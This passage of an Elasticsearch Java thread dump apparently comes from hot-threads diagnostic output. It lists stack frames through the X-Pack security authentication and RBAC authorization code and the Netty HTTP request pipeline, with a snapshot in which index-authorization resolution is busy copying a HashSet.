       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.core.common.IteratingActionListener.onResponse(IteratingActionListener.java:120)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:459)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5152/0x000000080181f6e0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$1(CachingUsernamePasswordRealm.java:146)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5225/0x0000000801838f88.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.handleCachedAuthentication(CachingUsernamePasswordRealm.java:197)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$2(CachingUsernamePasswordRealm.java:138)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5176/0x0000000801823490.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.addListener(ListenableFuture.java:68)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:133)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:104)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$15(AuthenticationService.java:448)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5133/0x000000080181dc60.accept(Unknown Source)
       org.elasticsearch.xpack.core.common.IteratingActionListener.run(IteratingActionListener.java:102)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:503)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5130/0x000000080181d5d8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$11(AuthenticationService.java:415)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5132/0x000000080181da38.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:425)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$checkForApiKey$3(AuthenticationService.java:366)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5116/0x000000080181b4f0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.ApiKeyService.authenticateWithApiKeyIfPresent(ApiKeyService.java:342)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.checkForApiKey(AuthenticationService.java:347)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$0(AuthenticationService.java:329)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5105/0x0000000801819878.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:388)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:325)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:141)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:126)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:63)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:236)
       app//org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:318)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:176)
       app//org.elasticsearch.http.AbstractHttpServerTransport.dispatchRequest(AbstractHttpServerTransport.java:318)
       app//org.elasticsearch.http.AbstractHttpServerTransport.handleIncomingRequest(AbstractHttpServerTransport.java:372)
       app//org.elasticsearch.http.AbstractHttpServerTransport.incomingRequest(AbstractHttpServerTransport.java:308)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:42)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:28)
       io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:99)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       org.elasticsearch.http.netty4.Netty4HttpPipeliningHandler.channelRead(Netty4HttpPipeliningHandler.java:58)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:324)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:296)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)
     unique snapshot
       java.base@15/java.util.HashMap.keysToArray(HashMap.java:951)
       java.base@15/java.util.HashSet.toArray(HashSet.java:367)
       java.base@15/java.util.ArrayList.<init>(ArrayList.java:181)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:531)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.shardExecute(TransportBroadcastReplicationAction.java:118)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:111)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:52)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:179)
       app//org.elasticsearch.action.support.ActionFilter$Simple.apply(ActionFilter.java:53)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:87)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4859/0x0000000801606ba0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$4(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4864/0x0000000801607698.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$15(AuthorizationService.java:365)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5216/0x00000008018386d8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.SearchRequestInterceptor.intercept(SearchRequestInterceptor.java:19)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.BulkShardRequestInterceptor.intercept(BulkShardRequestInterceptor.java:75)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.UpdateRequestInterceptor.intercept(UpdateRequestInterceptor.java:23)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.IndicesAliasesRequestInterceptor.intercept(IndicesAliasesRequestInterceptor.java:106)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.ResizeRequestInterceptor.intercept(ResizeRequestInterceptor.java:86)
       org.elasticsearch.xpack.security.authz.AuthorizationService.runRequestInterceptors(AuthorizationService.java:366)
       org.elasticsearch.xpack.security.authz.AuthorizationService.handleIndexActionAuthorizationResult(AuthorizationService.java:343)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$9(AuthorizationService.java:285)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5199/0x0000000801826b60.accept(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:641)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:616)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.buildIndicesAccessControl(RBACEngine.java:541)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$3(RBACEngine.java:321)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5203/0x0000000801827430.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.resolveIndexNames(AuthorizationService.java:579)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$6(AuthorizationService.java:273)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5207/0x0000000801827cf0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
